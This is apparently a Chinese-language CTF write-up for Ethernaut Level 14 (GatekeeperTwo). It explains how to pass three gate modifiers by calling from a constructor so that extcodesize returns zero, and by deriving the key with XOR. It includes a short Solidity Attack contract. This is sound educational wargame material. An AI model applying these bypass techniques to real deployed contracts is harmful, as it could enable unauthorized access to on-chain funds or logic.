<div align="center">
<p align="left">(<a href="https://github.com/XuHugo/Ethernaut-Foundry-Solutions/tree/main/solutions">back</a>)</p>

<img src="../assets/levels/14-gate2.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 14 - Gate Keeper Two</strong></h1>

</div>
<br>

详细解读文章: [Ethernaut Foundry Solutions | Level 14 - Telephone](https://blog.csdn.net/xq723310/)

## 目录

- [目录](#目录)
- [目标](#目标)
- [漏洞](#漏洞)
    - [Modifier 1](#Modifier-1)
    - [Modifier 2](#Modifier-2)
    - [Modifier 3](#Modifier-3)
- [解答](#解答)
- [要点](#要点)

## 目标

目标是通过三个 modifier 的检测
<img src="../assets/requirements/14-gate2-requirements.webp" width="800px"/>

## 漏洞

和13类似，也是通过三个修饰器，让我们看看怎么回事。

### modifier-1

```javascript
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

完全一样，我们只需要从合约中调用`enter()`函数，那么`tx.origin`将是我们自己的账户。`msg.sender`则是合约。

### modifier-2

```javascript
modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
}
```

`extcodesize`操作码返回给定地址处的代码大小，这里的地址指的是`caller()`————调用函数的账户。如果地址是一个合约，它将返回合约代码的大小。如果地址是EOA，它将返回0。

所以，问题来了，看来我们不能使用合约了。然而，不使用合约，没有办法通过第一个修饰器。那么还有别的解决办法吗?

当然有啦。如果我们从`constructor`调用`enter()`，那么`extcodesize`将返回0，原因也很好理解，你初始化那么会儿还没有部署合约嘛，所以返回0。

### modifier-3

```javascript
modifier gateThree(bytes8 _gateKey) {
     require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
}
```

看起来有点复杂，其实很简单，就是简单的异或运算嘛。我把它简化一下，就是:

```
    已知 `A ^ B == C`,求证 `A ^ C == B`，
    A = bytes8(keccak256(abi.encodePacked(msg.sender)))
    B = _gateKey
    C = type(uint64).max
```
可以自己先算一下。
答案再次：
```
    // XOR 运算
    0 ^ 0 = 0
    0 ^ 1 = 1
    1 ^ 0 = 1
    1 ^ 1 = 0

    // 已知：
    a ^ b = c

    // 证明:
    a ^ c = b 

    // 解答:
    a ^ b = c 
    ⇒ a ^ (a ^ b) = a ^ c  // taking ^ with 'a' both side
    ⇒ (a ^ a) ^ b = a ^ c
    ⇒ 0 ^ b = a ^ c  // as a ^ a = 0
    ⇒ a ^ c = b
```


## 解答

现在我们可以编写自己的合约了。

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Attack {
    GatekeeperTwo instance;

    constructor(address fb) {
        instance = GatekeeperTwo(fb);

        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^
            0xFFFFFFFFFFFFFFFF;
        instance.enter(gateKey);
    }
}
```

你可以在项目的根目录执行以下命令，进行验证；

```bash
forge test --match-contract  GatekeeperTwoTest
```

## 要点

-  `extcodesize` 操作码返回给定地址处的代码大小.
- 构造函数中合约的大小为0.

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
